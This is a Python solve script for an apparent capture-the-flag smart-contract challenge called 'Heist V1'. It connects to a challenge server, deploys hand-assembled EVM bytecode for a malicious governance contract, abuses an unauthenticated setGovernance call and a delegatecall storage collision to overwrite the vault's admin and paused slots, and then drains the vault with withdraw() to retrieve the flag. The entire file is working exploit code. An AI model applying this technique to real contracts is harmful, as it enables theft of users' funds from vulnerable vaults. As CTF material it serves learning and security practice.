#!/usr/bin/env python3
"""Heist V1 - delegatecall storage collision exploit
Deploy malicious contract via raw bytecode, overwrite admin+paused, withdraw.
"""
import socket, time, sys, re
from web3 import Web3

HOST = sys.argv[1] if len(sys.argv) > 1 else '135.235.193.111'
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 1337

def recv_until(s, marker, timeout=10):
    s.settimeout(timeout)
    data = b''
    start = time.time()
    while time.time() - start < timeout:
        try:
            chunk = s.recv(4096)
            if not chunk: break
            data += chunk
            if marker.encode() in data: break
        except socket.timeout: break
    return data.decode('utf-8', errors='replace')

# Connect and get instance
s = socket.socket()
s.connect((HOST, PORT))
banner = recv_until(s, '>')
print(banner)

rpc = re.search(r'RPC URL\s*:\s*(http\S+)', banner).group(1)
vault_addr = re.search(r'Vault\s*:\s*(0x[0-9a-fA-F]+)', banner).group(1)
pk = re.search(r'Private Key:\s*(0x[0-9a-fA-F]+)', banner).group(1)

w3 = Web3(Web3.HTTPProvider(rpc))
acct = w3.eth.account.from_key(pk)
player = acct.address
print(f"Player: {player}")
print(f"Vault balance: {w3.eth.get_balance(vault_addr)}")

def send_tx(to, data=b'', value=0, gas=500000):
    tx = {
        'to': to,
        'data': data,
        'value': value,
        'gas': gas,
        'gasPrice': w3.eth.gas_price,
        'nonce': w3.eth.get_transaction_count(player),
        'chainId': w3.eth.chain_id,
    }
    signed = acct.sign_transaction(tx)
    tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    print(f"  TX status={receipt['status']} gas={receipt['gasUsed']}")
    return receipt

# Deploy malicious contract (fallback: sstore(0,0), sstore(1,caller()), stop)
# Runtime: 60 00 60 00 55 33 60 01 55 00 = 10 bytes
# Init: push10 dup1 push_offset push0 codecopy push0 return
#   60 0a 80 60 0b 60 00 39 60 00 f3 = 11 bytes
print("\n=== Deploy MalGov ===")
init_code = '600a80600b6000396000f3'  # 11 bytes
runtime = '60006000553360015500'       # 10 bytes
deploy_data = bytes.fromhex(init_code + runtime)

tx = {
    'data': deploy_data,
    'value': 0,
    'gas': 1000000,
    'gasPrice': w3.eth.gas_price,
    'nonce': w3.eth.get_transaction_count(player),
    'chainId': w3.eth.chain_id,
}
signed = acct.sign_transaction(tx)
tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
malgov = receipt['contractAddress']
print(f"  MalGov: {malgov} status={receipt['status']}")

# Verify deployed code
code = w3.eth.get_code(malgov)
print(f"  Code: {code.hex()}")

# Step 1: setGovernance(MalGov) — no auth check!
print("\n=== setGovernance ===")
set_gov = Web3.keccak(text='setGovernance(address)')[:4]
set_gov += bytes(12) + bytes.fromhex(malgov[2:])
send_tx(vault_addr, set_gov)

# Step 2: execute(any_data) — delegatecall to MalGov triggers fallback
print("\n=== execute (delegatecall) ===")
execute_sel = Web3.keccak(text='execute(bytes)')[:4]
# ABI encode bytes parameter: offset=0x20, length=0, (empty bytes)
abi = execute_sel + (0x20).to_bytes(32, 'big') + (0).to_bytes(32, 'big')
send_tx(vault_addr, abi)

# Verify storage
slot0 = w3.eth.get_storage_at(vault_addr, 0).hex()
slot1 = w3.eth.get_storage_at(vault_addr, 1).hex()
print(f"  Slot 0 (should be 0): {slot0}")
print(f"  Slot 1 (should be player): {slot1}")

# Step 3: withdraw
print("\n=== Withdraw ===")
withdraw_sel = Web3.keccak(text='withdraw()')[:4]
send_tx(vault_addr, withdraw_sel)

balance = w3.eth.get_balance(vault_addr)
print(f"Vault balance: {balance}")

# Get flag
print("\n=== Flag ===")
s.sendall(b'1\n')
time.sleep(0.5)
resp = recv_until(s, '>', timeout=5)
print(resp)

m = re.search(r'EH4X\{[^}]+\}', resp)
if m:
    flag = m.group()
    print(f"\nFLAG: {flag}")
    with open("flag.txt", "w") as f:
        f.write(flag)

s.close()
